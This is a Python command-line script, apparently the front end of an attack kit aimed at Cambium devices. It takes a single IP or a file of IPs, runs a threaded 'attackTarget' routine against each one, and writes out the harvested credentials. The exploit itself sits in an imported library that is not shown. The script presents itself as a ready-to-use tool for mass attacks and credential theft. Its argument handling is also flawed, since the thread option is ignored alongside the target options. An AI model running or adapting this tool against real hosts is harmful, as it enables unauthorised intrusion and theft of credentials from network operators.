#!/usr/bin/env python3
import sys
import cambiumlib as cam
from concurrent.futures import ThreadPoolExecutor

banner = """      ----------      ---      ---      ---
   ================   ===     ===    ===   ===
   ===          ===   ===    ===   ===        ===
   ===          ===   ===   ===    ===        ===
   ===                === ===      ===        ===
   ###                ### ###              ###
   ###          ###   ###  ###            ###
   ###          ###   ###   ###         ###
   ###          ###   ###    ###      ####
      ##########      ###     ###    ############
      ----------      ---      ---  -------------

Written by InfiniteNull"""

targetFile = ""
target = ""
threads = 4
verbose = False

def usage():
    print(sys.argv[0], "-f <ipFile>")
    print(sys.argv[0], "-h <ip>")
    print("-f <ipfile> - File with an IP on each line")
    print("-h <ip> - IP of host to attack")
    print("-t <int> - number of threads to use in attack. Default is 4 (doesn't apply when attacking single host)")

# Print banner
print(banner + "\n")

# Evaluate command line arguments
if "-v" in sys.argv or "--verbose" in sys.argv:
    verbose = True

if "-f" in sys.argv:
    try:
        targetFileArgIndex = sys.argv.index("-f") + 1 # The argument after -f
        targetFile = sys.argv[targetFileArgIndex]
    except:
        usage()
        sys.exit(0)
elif "-h" in sys.argv:
    try:
        targetArgIndex = sys.argv.index("-h") + 1 # The argument after -h
        target = sys.argv[targetArgIndex]
    except:
        usage()
        sys.exit(0)
elif "-t" in sys.argv:
    try:
        threadArgIndex = sys.argv.index("-t") + 1 # The argument after -t
        threads = sys.argv[threadArgIndex]
    except:
        usage()
        sys.exit(0)
elif "-h" in sys.argv and "-f" in sys.argv:
    usage()
    sys.exit(0)
else:
    usage()
    sys.exit(0)

### Main #######
ckit = cam.CambiumKit()

if target:
    ckit.attackTarget(target)
    ckit.writeCreds()
elif targetFile:
    # Read target IPs file
    with open(targetFile, "r") as f:
        targetList = [line.replace("\n", "") for line in f.readlines()]

    ckit.showMsg(f"Read {len(targetList)} targets from {targetFile}")
    # Start up threaded attack
    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(ckit.attackTarget, targetList)

    ckit.writeCreds()
